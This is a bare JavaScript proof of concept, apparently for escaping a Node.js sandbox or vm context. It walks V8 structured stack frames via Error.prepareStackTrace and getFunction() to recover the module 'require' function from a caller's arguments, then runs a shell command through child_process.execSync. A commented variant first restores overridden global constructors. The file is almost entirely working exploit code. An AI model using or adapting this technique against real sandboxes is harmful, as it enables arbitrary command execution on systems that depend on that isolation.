function CustomError() {
    const oldStackTrace = Error.prepareStackTrace;
    try {
      Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace;
      Error.captureStackTrace(this);
      this.stack; // Invoke the getter for `stack`.
    } finally {
      Error.prepareStackTrace = oldStackTrace;
    }
}

function myFunction() {
    const err = new CustomError();
    console.log(err.stack[0]);
    console.log(err.stack[0].getFunction);
    for (const x of err.stack) {
		const fn = x.getFunction()
        console.log(fn)
		// console.log(String(fn).slice(0, 200))
		// console.log(fn?.arguments)
		// console.log('='.repeat(40))
		if (((args = fn?.arguments)?.length > 0) && (typeof args[1] == 'function')) {
			req = args[1]
			console.log(req('child_process').execSync('id').toString())
		}
	}
}
myFunction();
// try {
// 	null.f()
// } catch (e) {
// 	TypeError = e.constructor
// }
// Object = {}.constructor
// String = ''.constructor
// Error = TypeError.prototype.__proto__.constructor
// function CustomError() {
// 	const oldStackTrace = Error.prepareStackTrace
// 	try {
// 		Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
// 		Error.captureStackTrace(this)
// 		this.stack
// 	} finally {
// 		Error.prepareStackTrace = oldStackTrace
// 	}
// }
// function trigger() {
// 	const err = new CustomError()
// 	console.log(err.stack[0])
// 	for (const x of err.stack) {
// 		const fn = x.getFunction()
// 		// console.log(String(fn).slice(0, 200))
// 		// console.log(fn?.arguments)
// 		// console.log('='.repeat(40))
// 		if (((args = fn?.arguments)?.length > 0) && (typeof args[1] == 'function')) {
// 			req = args[1]
// 			console.log(req('child_process').execSync('id').toString())
// 		}
// 	}
// }
// trigger()